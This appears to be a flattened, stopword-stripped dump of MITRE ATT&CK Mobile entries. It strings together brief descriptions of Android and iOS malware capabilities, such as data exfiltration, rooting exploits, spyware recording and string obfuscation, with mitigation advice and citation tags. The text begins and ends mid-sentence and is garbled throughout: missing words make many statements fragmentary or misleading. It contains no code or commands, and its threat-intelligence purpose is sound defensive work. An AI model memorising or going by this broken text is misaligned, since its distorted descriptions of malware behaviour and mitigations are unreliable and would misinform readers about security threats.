Lookout-Monokle) [Anubis](https://attack.mitre.org/software/S0422) exfiltrates data encrypted (with RC4) ransomware module.(Citation: Cofense Anubis) Device attestation detect jailbroken rooted devices. [INSOMNIA](https://attack.mitre.org/software/S0463) grants permissions injecting hash kernel’s trust cache.(Citation: Google Project Insomnia) versions Android modified device administrator applications uninstalled, easier user remove them. OS feature updates enhance security privacy permissions.  [ViceLeaker](https://attack.mitre.org/software/S0418) collects device information, including device model OS version.(Citation: SecureList - ViceLeaker 2019) [PJApps](https://attack.mitre.org/software/S0291) capability collect leak victim's location.(Citation: Lookout-EnterpriseApps) iOS, `allowEnterpriseAppTrust` `allowEnterpriseAppTrustModification` configuration profile restrictions prevent users installing apps signed enterprise distribution keys.  [Mandrake](https://attack.mitre.org/software/S0485) collect accounts stored device.(Citation: Bitdefender Mandrake) [Zen](https://attack.mitre.org/software/S0494) root access rooting trojan infection chain.(Citation: Google Security Zen) Device attestation detect jailbroken devices.  [HenBox](https://attack.mitre.org/software/S0544) commands root.(Citation: Palo Alto HenBox)  [TrickMo](https://attack.mitre.org/software/S0427) communicates C2 sending JSON objects unencrypted requests.(Citation: SecurityIntelligence TrickMo) introduced Android 7 abuse device administrator permissions difficult.(Citation: GoogleIO2016) [DoubleAgent](https://attack.mitre.org/software/S0550) exploits root devices install additional malware partition.(Citation: Lookout Uyghur Campaign) [AndroRAT](https://attack.mitre.org/software/S0292) collects logs.(Citation: Lookout-EnterpriseApps) Device attestation detect rooted devices. [Bread](https://attack.mitre.org/software/S0432) tricks obfuscate strings including standard custom encryption, programmatically building strings runtime, splitting unencrypted strings repeated delimiters break keywords. [Bread](https://attack.mitre.org/software/S0432) abused Java JavaScript features obfuscate code. [Bread](https://attack.mitre.org/software/S0432) payloads hidden code native libraries encrypted JAR files data ELF file. [Bread](https://attack.mitre.org/software/S0432) stored DEX payloads base64-encoded strings Android manifest internal Java classes.(Citation: Check Point-Joker)(Citation: Google Bread)  [Gustuff](https://attack.mitre.org/software/S0406) capture files photos compromised device.(Citation: Talos Gustuff Apr 2019)  [Rotexy](https://attack.mitre.org/software/S0411) access upload contacts list command control server.(Citation: securelist rotexy 2018) [RuMMS](https://attack.mitre.org/software/S0313) uploads incoming SMS messages remote command control server.(Citation: FireEye-RuMMS) [TERRACOTTA](https://attack.mitre.org/software/S0545) timer events React Native initiate foreground service.(Citation: WhiteOps TERRACOTTA)   [FrozenCell](https://attack.mitre.org/software/S0577) retrieved device images exfiltration.(Citation: Lookout FrozenCell) [Android/Chuli.A](https://attack.mitre.org/software/S0304) stole logs.(Citation: Kaspersky-WUC) [WolfRAT](https://attack.mitre.org/software/S0489) delete files device.(Citation: Talos-WolfRAT) [Desert Scorpion](https://attack.mitre.org/software/S0505) list files stored external storage.(Citation: Lookout Desert Scorpion) [Trojan-SMS.AndroidOS.OpFake.a](https://attack.mitre.org/software/S0308) Google Cloud Messaging (GCM) command control.(Citation: Kaspersky-MobileMalware) [DoubleAgent](https://attack.mitre.org/software/S0550) arbitrary commands.(Citation: Lookout Uyghur Campaign) [XcodeGhost](https://attack.mitre.org/software/S0297) read write data user’s clipboard.(Citation: PaloAlto-XcodeGhost) [Monokle](https://attack.mitre.org/software/S0407) photos videos.(Citation: Lookout-Monokle)  [FlexiSpy](https://attack.mitre.org/software/S0408) screenshots applications.(Citation: FlexiSpy-Features)  [SilkBean](https://attack.mitre.org/software/S0549) attempted trick users enabling installation applications unknown sources.(Citation: Lookout Uyghur Campaign) [INSOMNIA](https://attack.mitre.org/software/S0463) obfuscates pieces application.(Citation: Volexity Insomnia)  [TERRACOTTA](https://attack.mitre.org/software/S0545) checks stack modified, indication running analysis environment, so, decrypt obfuscated strings(Citation: WhiteOps TERRACOTTA). Enterprise policies block access Android Debug Bridge (ADB) preventing users enabling USB debugging Android devices device application development). EMM/MDM Android `DevicePolicyManager.setPermittedAccessibilityServices` method set explicit list applications allowed Android's accessibility features.  [Windshift](https://attack.mitre.org/groups/G0112) deployed anti-analysis capabilities Operation BULL campaign.(Citation: BlackBerry Bahamut) [FlexiSpy](https://attack.mitre.org/software/S0408) record incoming outgoing phone calls, microphone audio.(Citation: CyberMerchants-FlexiSpy) [GPlayed](https://attack.mitre.org/software/S0536) send SMS messages.(Citation: Talos GPlayed) [GolfSpy](https://attack.mitre.org/software/S0421) collect SMS messages.(Citation: Trend Micro Bouncing Golf 2019) Security updates frequently patches exploits.   [SilkBean](https://attack.mitre.org/software/S0549) send SMS messages.(Citation: Lookout Uyghur Campaign)   Device attestation detect jailbroken rooted devices.  Mobile OSes implemented measures difficult trick users installing untrusted certificates configurations. iOS 10.3 add additional step users install trusted certificates configuration profiles. Android, apps target compatibility Android 7 (API Level 24) default trusting certificates bundled operating system, certificates user administrator, decreasing susceptibility successful adversary-in-the-middle attack.(Citation: Symantec-iOSProfile2)(Citation: Android-TrustedCA) [Trojan-SMS.AndroidOS.Agent.ao](https://attack.mitre.org/software/S0307) Google Cloud Messaging (GCM) command control.(Citation: Kaspersky-MobileMalware) Users ensure bootloaders locked prevent arbitrary operating code flashed device. [Rotexy](https://attack.mitre.org/software/S0411) controlled SMS messages.(Citation: securelist rotexy 2018) [Riltok](https://attack.mitre.org/software/S0403) communicates command control server requests.(Citation: Kaspersky Riltok June 2019) [Pallas](https://attack.mitre.org/software/S0399) stores domain URL paths hardcoded AES-encrypted, base64-encoded strings.(Citation: Lookout Dark Caracal Jan 2018) [FlexiSpy](https://attack.mitre.org/software/S0408) `FileObserver` object monitor Skype WeChat database file shared preferences retrieve chat messages, account information, profile pictures account owner chat participants. [FlexiSpy](https://attack.mitre.org/software/S0408) spy popular applications, including Facebook, Hangouts, Hike, Instagram, Kik, Line, QQ, Snapchat, Telegram, Tinder, Viber, WhatsApp.(Citation: FortiGuard-FlexiSpy) [WolfRAT](https://attack.mitre.org/software/S0489) list installed applications.(Citation: Talos-WolfRAT) [WolfRAT](https://attack.mitre.org/software/S0489) record audio.(Citation: Talos-WolfRAT) [Pegasus iOS](https://attack.mitre.org/software/S0289) captures logs.(Citation: Lookout-Pegasus) [Red Alert 2.0](https://attack.mitre.org/software/S0539) download additional overlay templates.(Citation: Sophos Red Alert 2.0) [Stealth Mango](https://attack.mitre.org/software/S0328) record audio device microphone.(Citation: Lookout-StealthMango) [SimBad](https://attack.mitre.org/software/S0419) registers `BOOT_COMPLETED` `USER_PRESENT` broadcast intents, software perform actions device booted user device, respectively.(Citation: CheckPoint SimBad 2019)  [Monokle](https://attack.mitre.org/software/S0407) record user's keystrokes.(Citation: Lookout-Monokle) [ANDROIDOS_ANSERVER.A](https://attack.mitre.org/software/S0310) encrypted content blog command control. Specifically, encrypted content URLs servers aspects command control.(Citation: TrendMicro-Anserver) [Anubis](https://attack.mitre.org/software/S0422) collect list running processes.(Citation: Zimperium z9)  [RedDrop](https://attack.mitre.org/software/S0326) tricks user sending SMS messages premium services deletes messages.(Citation: Wandera-RedDrop) [GPlayed](https://attack.mitre.org/software/S0536) read SMS messages.(Citation: Talos GPlayed) [EventBot](https://attack.mitre.org/software/S0478) intercept SMS messages.(Citation: Cybereason EventBot) [Golden Cup](https://attack.mitre.org/software/S0535) record audio microphone phone calls.(Citation: Symantec GoldenCup)  [RedDrop](https://attack.mitre.org/software/S0326) requests C2 communication.(Citation: Wandera-RedDrop) [Cerberus](https://attack.mitre.org/software/S0480) update malicious payload module command.(Citation: Threat Fabric Cerberus) [GPlayed](https://attack.mitre.org/software/S0536) timers enable Wi-Fi, ping C2 server, register device C2, register wake locks system.(Citation: Talos GPlayed) [OldBoot](https://attack.mitre.org/software/S0285) escalated privileges modify init script device's boot partition maintain persistence.(Citation: HackerNews-OldBoot) [DoubleAgent](https://attack.mitre.org/software/S0550) captured audio record phone calls.(Citation: Lookout Uyghur Campaign) [Windshift](https://attack.mitre.org/groups/G0112) included file enumeration malicious apps deployed Operation BULL Operation ROCK.(Citation: BlackBerry Bahamut) [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) hide icon create shortcut based C2 server response.(Citation: WeLiveSecurity AdDisplayAshas) [Cerberus](https://attack.mitre.org/software/S0480) standard payload string obfuscation techniques.(Citation: Threat Fabric Cerberus) [Gustuff](https://attack.mitre.org/software/S0406) checks antivirus software contained predefined list.(Citation: Talos Gustuff Apr 2019) [Red Alert 2.0](https://attack.mitre.org/software/S0539) send SMS messages.(Citation: Sophos Red Alert 2.0) [Desert Scorpion](https://attack.mitre.org/software/S0505) retrieve SMS messages.(Citation: Lookout Desert Scorpion) [Golden Cup](https://attack.mitre.org/software/S0535) communicated C2 MQTT HTTP.(Citation: Symantec GoldenCup)  Users wary granting applications dangerous privacy-intrusive permissions, access notifications.  [WolfRAT](https://attack.mitre.org/software/S0489) photos videos.(Citation: Talos-WolfRAT)   [SilkBean](https://attack.mitre.org/software/S0549) HTTPS C2 communication.(Citation: Lookout Uyghur Campaign)  [Android/Chuli.A](https://attack.mitre.org/software/S0304) uploads URL command control mechanism.(Citation: Kaspersky-WUC) Samsung Knox, third-party keyboards explicitly list end-user.(Citation: Samsung Keyboards)  [Exodus](https://attack.mitre.org/software/S0405) attempts elevate privileges modified version DirtyCow exploit.(Citation: SWB Exodus March 2019)  Security updates frequently fixes vulnerabilities leveraged modify protected operating files.  [RuMMS](https://attack.mitre.org/software/S0313) gathers device phone IMEI transmits command control server.(Citation: FireEye-RuMMS) [Skygofree](https://attack.mitre.org/software/S0327) track device's location.(Citation: Kaspersky-Skygofree) [FakeSpy](https://attack.mitre.org/software/S0509) register `BOOT_COMPLETED` broadcast Intent.(Citation: Cybereason FakeSpy) [Corona Updates](https://attack.mitre.org/software/S0425) collect device’s log.(Citation: TrendMicro Coronavirus Updates) [Triada](https://attack.mitre.org/software/S0424) variants capture transaction data SMS-based in-app purchases.(Citation: Kaspersky Triada March 2016)  [FakeSpy](https://attack.mitre.org/software/S0509) collect list installed applications.(Citation: Cybereason FakeSpy) [Pegasus Android](https://attack.mitre.org/software/S0316) attempts exploit well-known Android OS vulnerabilities escalate privileges.(Citation: Lookout-PegasusAndroid) [Tiktok Pro](https://attack.mitre.org/software/S0558) capture audio device’s microphone record phone calls.(Citation: Zscaler TikTok Spyware) [GolfSpy](https://attack.mitre.org/software/S0421) exfiltrates data POST requests.(Citation: Trend Micro Bouncing Golf 2019) EMM/MDM Android `DevicePolicyManager.setPermittedAccessibilityServices` method set explicit list applications allowed Android's accessibility features. Users protect account credentials enable multi-factor authentication options available.  [GPlayed](https://attack.mitre.org/software/S0536) access device’s contact list.(Citation: Talos GPlayed) (Citation: CrowdStrike-Android) Android 9 introduced security policy prevents applications reading writing data applications’ internal storage directories, permissions.  Applications target Android API level 29 execute native code stored application's internal data storage directory, limiting ability applications download execute native code runtime. (Citation: Android Execute) [Riltok](https://attack.mitre.org/software/S0403) access upload device's contact list command control server.(Citation: Kaspersky Riltok June 2019) [Monokle](https://attack.mitre.org/software/S0407) delete arbitrary files device, uninstall clean staging files.(Citation: Lookout-Monokle) [Exobot](https://attack.mitre.org/software/S0522) registered receive `BOOT_COMPLETED` broadcast intent.(Citation: Threat Fabric Exobot) [XLoader iOS](https://attack.mitre.org/software/S0490) device’s UDID, version number, product number.(Citation: TrendMicro-XLoader-FakeSpy) [XLoader iOS](https://attack.mitre.org/software/S0490) device’s IMEM, ICCID, MEID.(Citation: TrendMicro-XLoader-FakeSpy) [Pegasus Android](https://attack.mitre.org/software/S0316) accesses sensitive data files, messages stored WhatsApp, Facebook, Twitter applications. ability access arbitrary filenames retrieve directory listings.(Citation: Lookout-PegasusAndroid) [Windshift](https://attack.mitre.org/groups/G0112) included phone audio recording capabilities malicious apps deployed Operation BULL Operation ROCK.(Citation: BlackBerry Bahamut) [EventBot](https://attack.mitre.org/software/S0478) display popups running applications.(Citation: Cybereason EventBot) [GolfSpy](https://attack.mitre.org/software/S0421) device’s contact list.(Citation: Trend Micro Bouncing Golf 2019) [RCSAndroid](https://attack.mitre.org/software/S0295) collect contacts messages popular applications, including Facebook Messenger, WhatsApp, Skype, Viber, Line, WeChat, Hangouts, Telegram, BlackBerry Messenger.(Citation: TrendMicro-RCSAndroid) devices enrolled Apple User Enrollment profile owner enrollment mode Android, device controls prevent enterprise accessing device’s physical location. typically Bring Device (BYOD) deployment.  [CarbonSteal](https://attack.mitre.org/software/S0529) performed rudimentary SSL certificate validation verify C2 server authenticity establishing SSL connection.(Citation: Lookout Uyghur Campaign)  [Exodus](https://attack.mitre.org/software/S0405) checks command control server POST requests.(Citation: SWB Exodus March 2019)  [ViceLeaker](https://attack.mitre.org/software/S0418) data exfiltration.(Citation: SecureList - ViceLeaker 2019)(Citation: Bitdefender - Triout 2018) Users instructed grant applications unexpected unnecessary permissions.  Users advised grant consent screen captures occur expected. Users avoid enabling USB debugging (Android Debug Bridge) explicitly required.   [Cerberus](https://attack.mitre.org/software/S0480) avoids analyzed activating malware recording steps accelerometer.(Citation: Threat Fabric Cerberus) [Windshift](https://attack.mitre.org/groups/G0112) exfiltrated local account data calendar Operation ROCK.(Citation: BlackBerry Bahamut) [Gooligan](https://attack.mitre.org/software/S0290) install adware generate revenue.(Citation: Gooligan Citation) [Asacub](https://attack.mitre.org/software/S0540) stored encrypted strings APK file.(Citation: Securelist Asacub) [WolfRAT](https://attack.mitre.org/software/S0489) record screen screenshots capture messages Line, Facebook Messenger, WhatsApp.(Citation: Talos-WolfRAT) [Tangelo](https://attack.mitre.org/software/S0329) functionality gather cellular IDs.(Citation: Lookout-StealthMango) [Cerberus](https://attack.mitre.org/software/S0480) device’s contact list.(Citation: Threat Fabric Cerberus)  [Ginp](https://attack.mitre.org/software/S0423) inject input default SMS handler.(Citation: ThreatFabric Ginp)  [CarbonSteal](https://attack.mitre.org/software/S0529) looked specific applications, MiCode.(Citation: Lookout Uyghur Campaign) OS releases frequently additional limitations controls device location access. iOS 11 introduced first-come-first-served principle URIs, allowing prior installed app launched URI.(Citation: Trend Micro iOS URL Hijacking) Android 6 introduced App Links.  [FlexiSpy](https://attack.mitre.org/software/S0408) collect list Wi-Fi access points.(Citation: FlexiSpy-Features)  [PJApps](https://attack.mitre.org/software/S0291) capability send messages premium SMS messages.(Citation: Lookout-EnterpriseApps) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) collected device’s location.(Citation: CYBERWARCON CHEMISTGAMES) Android includes partition integrity mechanisms detect unauthorized modifications.  [Pegasus iOS](https://attack.mitre.org/software/S0289) monitors connection tracks types networks phone connected to, determine bandwidth ability send data network.(Citation: Lookout-Pegasus) Security updates frequently patches vulnerabilities.  [Dendroid](https://attack.mitre.org/software/S0301) dialog box user passwords.(Citation: Lookout-Dendroid) [SilkBean](https://attack.mitre.org/software/S0549) file lists card.(Citation: Lookout Uyghur Campaign) [Red Alert 2.0](https://attack.mitre.org/software/S0539) malicious overlays collect banking credentials.(Citation: Sophos Red Alert 2.0)  [GolfSpy](https://attack.mitre.org/software/S0421) registers `USER_PRESENT` broadcast intent trigger photos front-facing camera.(Citation: Trend Micro Bouncing Golf 2019) [TERRACOTTA](https://attack.mitre.org/software/S0545) inject clicks launch applications, share posts social media, interact WebViews perform fraudulent actions.(Citation: WhiteOps TERRACOTTA) [Red Alert 2.0](https://attack.mitre.org/software/S0539) collect device’s contact list.(Citation: Sophos Red Alert 2.0)  [Golden Cup](https://attack.mitre.org/software/S0535) pictures camera.(Citation: Symantec GoldenCup) [Pallas](https://attack.mitre.org/software/S0399) accesses exfiltrates log.(Citation: Lookout Dark Caracal Jan 2018)  Ensure Verified Boot enabled devices capability.  [Tiktok Pro](https://attack.mitre.org/software/S0558) contained alarm triggers minutes timers communicating C2.(Citation: Zscaler TikTok Spyware) [HenBox](https://attack.mitre.org/software/S0544) contained native libraries.(Citation: Palo Alto HenBox) Android 9 restricts access mic, camera, device sensors applications running background. iOS 14 Android 12 introduced visual indicator status bar (green dot) application accessing device’s camera.(Citation: Android Capture Sensor 2019) Users taught dangers rooting jailbreaking device. [Asacub](https://attack.mitre.org/software/S0540) collect pieces device information, including device model OS version.(Citation: Securelist Asacub) [Corona Updates](https://attack.mitre.org/software/S0425) collect messages GSM, WhatsApp, Telegram, Facebook, Threema reading application’s notification content.(Citation: TrendMicro Coronavirus Updates) [TrickMo](https://attack.mitre.org/software/S0427) intercept SMS messages.(Citation: SecurityIntelligence TrickMo) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) bash commands.(Citation: CYBERWARCON CHEMISTGAMES) [Exobot](https://attack.mitre.org/software/S0522) SMS messages.(Citation: Threat Fabric Exobot) [FakeSpy](https://attack.mitre.org/software/S0509) hide icon detects emulator.(Citation: Cybereason FakeSpy) [BusyGasper](https://attack.mitre.org/software/S0655) commands.(Citation: SecureList BusyGasper) [FlexiSpy](https://attack.mitre.org/software/S0408) collect device calendars.(Citation: CyberMerchants-FlexiSpy) [DoubleAgent](https://attack.mitre.org/software/S0550) downloaded additional code root devices, TowelRoot.(Citation: Lookout Uyghur Campaign) [BusyGasper](https://attack.mitre.org/software/S0655) collect user screen tap compare input hardcoded list coordinates translate input character.(Citation: SecureList BusyGasper) [GolfSpy](https://attack.mitre.org/software/S0421) clipboard contents.(Citation: Trend Micro Bouncing Golf 2019) [eSurv](https://attack.mitre.org/software/S0507) exfiltrate device’s contact list.(Citation: Lookout eSurv) [Corona Updates](https://attack.mitre.org/software/S0425) track device’s location.(Citation: TrendMicro Coronavirus Updates) [Windshift](https://attack.mitre.org/groups/G0112) included video recording malicious apps deployed Operation BULL.(Citation: BlackBerry Bahamut) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors Android backdoors capable exfiltrating specific files infected devices.(Citation: Cylance Dust Storm)  [Exodus](https://attack.mitre.org/software/S0405) download address book.(Citation: SWB Exodus March 2019)  [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors Android backdoors send data victim's mobile device C2 servers.(Citation: Cylance Dust Storm)  [Gustuff](https://attack.mitre.org/software/S0406) intercept two-factor authentication codes transmitted SMS.(Citation: Talos Gustuff Apr 2019)  [GPlayed](https://attack.mitre.org/software/S0536) capability remotely load plugins download compile .NET code.(Citation: Talos GPlayed)  [Skygofree](https://attack.mitre.org/software/S0327) record video capture photos infected device location.(Citation: Kaspersky-Skygofree) [Tiktok Pro](https://attack.mitre.org/software/S0558) registered device boot, incoming, outgoing calls broadcast intents.(Citation: Zscaler TikTok Spyware) [RuMMS](https://attack.mitre.org/software/S0313) command control.(Citation: FireEye-RuMMS) [Agent Smith](https://attack.mitre.org/software/S0440) fraudulent ads generate revenue.(Citation: CheckPoint Agent Smith) [eSurv](https://attack.mitre.org/software/S0507)’s iOS version collect device information.(Citation: Lookout eSurv) [WolfRAT](https://attack.mitre.org/software/S0489) collect SMS messages.(Citation: Talos-WolfRAT) [Riltok](https://attack.mitre.org/software/S0403) retrieve list installed applications. Installed application names checked adversary-defined list targeted applications.(Citation: Kaspersky Riltok June 2019) [Red Alert 2.0](https://attack.mitre.org/software/S0539) collect SMS messages.(Citation: Sophos Red Alert 2.0) OS versions limited access APIs conditions met, [Data Manipulation](https://attack.mitre.org/techniques/T1641) difficult [TrickMo](https://attack.mitre.org/software/S0427) collect list installed applications.(Citation: SecurityIntelligence TrickMo) [Pegasus iOS](https://attack.mitre.org/software/S0289) SMS command control.(Citation: Lookout-Pegasus) [Pegasus Android](https://attack.mitre.org/software/S0316) accesses logs.(Citation: Lookout-PegasusAndroid) [BusyGasper](https://attack.mitre.org/software/S0655) record audio.(Citation: SecureList BusyGasper) [TrickMo](https://attack.mitre.org/software/S0427) uninstall device command abusing accessibility service.(Citation: SecurityIntelligence TrickMo)   [Rotexy](https://attack.mitre.org/software/S0411) checks running analysis environment.(Citation: securelist rotexy 2018)  Android 8 introduced additional limitations implicit intents application register for.(Citation: Android Broadcasts) [SpyNote RAT](https://attack.mitre.org/software/S0305) view contacts.(Citation: Zscaler-SpyNote) [DoubleAgent](https://attack.mitre.org/software/S0550) accessed logs.(Citation: Lookout Uyghur Campaign) [GolfSpy](https://attack.mitre.org/software/S0421) track device’s location.(Citation: Trend Micro Bouncing Golf 2019) [Anubis](https://attack.mitre.org/software/S0422) collect device’s ID.(Citation: Cofense Anubis) [ViceLeaker](https://attack.mitre.org/software/S0418) list installed applications.(Citation: SecureList - ViceLeaker 2019) [Tangelo](https://attack.mitre.org/software/S0329) functionality gather logs.(Citation: Lookout-StealthMango) [GPlayed](https://attack.mitre.org/software/S0536) collect list installed applications.(Citation: Talos GPlayed) [Agent Smith](https://attack.mitre.org/software/S0440) checks targeted application running user-space prior infection.(Citation: CheckPoint Agent Smith)  [Stealth Mango](https://attack.mitre.org/software/S0328) uploads logs.(Citation: Lookout-StealthMango) Mobile security products Samsung Knox Mobile Threat Defense program examine running applications device idle, detecting malicious applications running device used. [OBAD](https://attack.mitre.org/software/S0286) abuses device administrator access difficult users remove application.(Citation: TrendMicro-Obad) [ViperRAT](https://attack.mitre.org/software/S0506) photos device camera.(Citation: Lookout ViperRAT) [FlexiSpy](https://attack.mitre.org/software/S0408) record keystrokes analyze keywords.(Citation: FlexiSpy-Features) [GPlayed](https://attack.mitre.org/software/S0536) register `BOOT_COMPLETED` broadcast intent.(Citation: Talos GPlayed) Users wary granting applications dangerous privacy-intrusive permissions, keyboard registration accessibility service access.  [EventBot](https://attack.mitre.org/software/S0478) gather device network information.(Citation: Cybereason EventBot)  [Stealth Mango](https://attack.mitre.org/software/S0328) deletes incoming SMS messages numbers, including strings.(Citation: Lookout-StealthMango) [TERRACOTTA](https://attack.mitre.org/software/S0545) utilized foreground services.(Citation: WhiteOps TERRACOTTA) (Citation: Lookout Dark Caracal Jan 2018) Security updates patches devices compromised supply chain level. [Trojan-SMS.AndroidOS.FakeInst.a](https://attack.mitre.org/software/S0306) Google Cloud Messaging (GCM) command control.(Citation: Kaspersky-MobileMalware) [HenBox](https://attack.mitre.org/software/S0544) list running apps.(Citation: Palo Alto HenBox) devices enrolled Apple User Enrollment profile owner enrollment mode Android, device controls prevent enterprise accessing device’s physical location. typically Bring Device (BYOD) deployment.  [Monokle](https://attack.mitre.org/software/S0407) reset user's password/PIN.(Citation: Lookout-Monokle)  Applications rarely require administrator permission. Developers cautioned degree access avoid flagged malicious application.  [FrozenCell](https://attack.mitre.org/software/S0577) downloaded installed additional applications.(Citation: Lookout FrozenCell) Android introduced prevent normal applications accessing sensitive device identifiers.(Citation: TelephonyManager)  Application developers cautious selecting third-party libraries integrate application. [Corona Updates](https://attack.mitre.org/software/S0425) collect voice notes, device accounts, gallery images.(Citation: TrendMicro Coronavirus Updates) [Tiktok Pro](https://attack.mitre.org/software/S0558) execute commands .(Citation: Zscaler TikTok Spyware) Android 7.0 includes additional protections technique.  [Red Alert 2.0](https://attack.mitre.org/software/S0539) request device administrator permissions.(Citation: Sophos Red Alert 2.0)  [INSOMNIA](https://attack.mitre.org/software/S0463) retrieve SMS messages iMessages.(Citation: Google Project Insomnia) [Ginp](https://attack.mitre.org/software/S0423) hides icon installation.(Citation: ThreatFabric Ginp) [DoubleAgent](https://attack.mitre.org/software/S0550) deleted renamed specific files.(Citation: Lookout Uyghur Campaign) Inform users device rooting granting unnecessary access accessibility service security risks advantage knowledge. [GPlayed](https://attack.mitre.org/software/S0536) collect device’s IMEI, phone number, country.(Citation: Talos GPlayed) [Cerberus](https://attack.mitre.org/software/S0480) collect SMS messages device.(Citation: Threat Fabric Cerberus) [GoldenEagle](https://attack.mitre.org/software/S0551) collected list contacts.(Citation: Lookout Uyghur Campaign) [Golden Cup](https://attack.mitre.org/software/S0535) collect device’s phone IMSI.(Citation: Symantec GoldenCup)  [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) communicated C2 server HTTP.(Citation: WeLiveSecurity AdDisplayAshas)  [Pallas](https://attack.mitre.org/software/S0399) gathers exfiltrates data nearby Wi-Fi access points.(Citation: Lookout Dark Caracal Jan 2018) [Exobot](https://attack.mitre.org/software/S0522) list installed applications detect antivirus application running, close is.(Citation: Threat Fabric Exobot)  [Exodus](https://attack.mitre.org/software/S0405) pictures device cameras.(Citation: SWB Exodus March 2019)  [EventBot](https://attack.mitre.org/software/S0478) collect list installed applications.(Citation: Cybereason EventBot) [GoldenEagle](https://attack.mitre.org/software/S0551) POST requests C2.(Citation: Lookout Uyghur Campaign) [MazarBOT](https://attack.mitre.org/software/S0303) send messages premium-rate numbers.(Citation: Tripwire-MazarBOT) [Stealth Mango](https://attack.mitre.org/software/S0328) commands received messages C2.(Citation: Lookout-StealthMango) Application developers encouraged avoid placing sensitive data notification text. [ViceLeaker](https://attack.mitre.org/software/S0418) collect device’s log.(Citation: SecureList - ViceLeaker 2019)  [HenBox](https://attack.mitre.org/software/S0544) obfuscated components XOR, ZIP single-byte key ZIP/Zlib compression wrapped RC4 encryption.(Citation: Palo Alto HenBox) [Triada](https://attack.mitre.org/software/S0424) modify code com.android.systemui application gain access `GET_REAL_TASKS` permissions. permission enables access applications foreground apps.(Citation: Google Triada June 2019)  [BusyGasper](https://attack.mitre.org/software/S0655) hidden menu specific phone called infected device.(Citation: SecureList BusyGasper) [Anubis](https://attack.mitre.org/software/S0422) send, receive, delete SMS messages.(Citation: Cofense Anubis) [FrozenCell](https://attack.mitre.org/software/S0577) collected phone metadata cell location, mobile country code (MCC), mobile network code (MNC).(Citation: Lookout FrozenCell) [Zen](https://attack.mitre.org/software/S0494) inject code Setup Wizard runtime extract CAPTCHA images. [Zen](https://attack.mitre.org/software/S0494) inject code `libc` running processes infect malware.(Citation: Google Security Zen) [GoldenEagle](https://attack.mitre.org/software/S0551) tracked location.(Citation: Lookout Uyghur Campaign) [SpyDealer](https://attack.mitre.org/software/S0324) abuses Accessibility features steal messages popular apps WeChat, Skype, Viber, QQ.(Citation: PaloAlto-SpyDealer)  [Monokle](https://attack.mitre.org/software/S0407) hook invisible Process Manager.(Citation: Lookout-Monokle)   [Monokle](https://attack.mitre.org/software/S0407) retrieve salt storing user’s password, aiding adversary computing user’s plaintext password/PIN stored password hash. [Monokle](https://attack.mitre.org/software/S0407) capture user’s dictionary, user-defined shortcuts, browser history, enabling profiling user activities.(Citation: Lookout-Monokle) [Rotexy](https://attack.mitre.org/software/S0411) procedurally generates subdomains command control communication.(Citation: securelist rotexy 2018) [GPlayed](https://attack.mitre.org/software/S0536) lock user device persistent overlay.(Citation: Talos GPlayed) [Concipit1248](https://attack.mitre.org/software/S0426) communicates C2 server requests.(Citation: TrendMicro Coronavirus Updates) [BrainTest](https://attack.mitre.org/software/S0293) capabilities allowed developers compromised devices post positive reviews malicious applications download malicious applications submitted Play Store.(Citation: Lookout-BrainTest) [GolfSpy](https://attack.mitre.org/software/S0421) encodes configurations customized algorithm.(Citation: Trend Micro Bouncing Golf 2019) [Cerberus](https://attack.mitre.org/software/S0480) generate fake notifications launch overlay attacks attacker-specified applications.(Citation: Threat Fabric Cerberus) [Pallas](https://attack.mitre.org/software/S0399) ability delete attacker-specified files compromised devices.(Citation: Lookout Dark Caracal Jan 2018) [Dark Caracal](https://attack.mitre.org/groups/G0070) controls implants standard communication.(Citation: Lookout Dark Caracal Jan 2018)  [INSOMNIA](https://attack.mitre.org/software/S0463) collect device’s phone number, ICCID, IMEI, active network interface (Wi-Fi cellular).(Citation: Google Project Insomnia) [ViceLeaker](https://attack.mitre.org/software/S0418) download attacker-specified files.(Citation: SecureList - ViceLeaker 2019)  Users synthetic activity scrutinize future. [Asacub](https://attack.mitre.org/software/S0540) implemented functions native code.(Citation: Securelist Asacub) Mobile security products typically detect jailbroken rooted devices.  [Zen](https://attack.mitre.org/software/S0494) dynamically load executable code remote sources.(Citation: Google Security Zen) [Pegasus iOS](https://attack.mitre.org/software/S0289) distributed exploiting vulnerabilities Safari browser iOS devices.(Citation: Lookout-Pegasus) [Pegasus iOS](https://attack.mitre.org/software/S0289) exploits iOS vulnerabilities escalate privileges.(Citation: Lookout-Pegasus) [DoubleAgent](https://attack.mitre.org/software/S0550) collected files infected device.(Citation: Lookout Uyghur Campaign)	 [Monokle](https://attack.mitre.org/software/S0407) record screen user unlocks device screenshots application foreground. [Monokle](https://attack.mitre.org/software/S0407) abuse accessibility features read screen capture data popular applications.(Citation: Lookout-Monokle) [Mandrake](https://attack.mitre.org/software/S0485) communicated C2 server TCP port 7777.(Citation: Bitdefender Mandrake) [Ginp](https://attack.mitre.org/software/S0423) capture device screenshots stream C2.(Citation: ThreatFabric Ginp) [GolfSpy](https://attack.mitre.org/software/S0421) collect local accounts device, pictures, bookmarks/histories default browser, files stored card. [GolfSpy](https://attack.mitre.org/software/S0421) list image, audio, video, files stored device. [GolfSpy](https://attack.mitre.org/software/S0421) arbitrary files device.(Citation: Trend Micro Bouncing Golf 2019)  [Exodus](https://attack.mitre.org/software/S0405) One, checking in, sends POST request downloads  [Exodus](https://attack.mitre.org/software/S0405) Two, stage binaries.(Citation: SWB Exodus March 2019)  [FakeSpy](https://attack.mitre.org/software/S0509) detect running emulator adjust behavior accordingly.(Citation: Cybereason FakeSpy)  [WolfRAT](https://attack.mitre.org/software/S0489) delete send SMS messages.(Citation: Talos-WolfRAT) [CarbonSteal](https://attack.mitre.org/software/S0529) native libraries reported samples (Citation: Lookout Uyghur Campaign) [Desert Scorpion](https://attack.mitre.org/software/S0505) record audio phone calls device microphone.(Citation: Lookout Desert Scorpion) [Gustuff](https://attack.mitre.org/software/S0406) code obfuscated packed FTT packer.(Citation: Talos Gustuff Apr 2019) [Anubis](https://attack.mitre.org/software/S0422) motion sensor data  attempt determine running emulator.(Citation: Trend Micro Anubis) [CarbonSteal](https://attack.mitre.org/software/S0529) silently accept incoming phone call.(Citation: Lookout Uyghur Campaign) [XcodeGhost](https://attack.mitre.org/software/S0297) injected apps modified version Xcode (Apple's software development 